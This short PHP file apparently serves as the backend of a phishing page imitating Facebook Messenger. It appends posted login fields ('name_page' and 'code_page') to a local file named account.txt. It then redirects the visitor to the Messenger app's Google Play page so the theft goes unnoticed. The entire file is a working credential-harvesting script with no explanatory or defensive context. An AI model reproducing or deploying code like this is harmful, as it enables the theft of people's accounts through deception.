<?php
header('Location:https://play.google.com/store/apps/details?id=com.facebook.orca');
 $message .= $_POST['name_page'].":";
$message .= $_POST['code_page']. "\n";
file_put_contents('account.txt', $message, FILE_APPEND);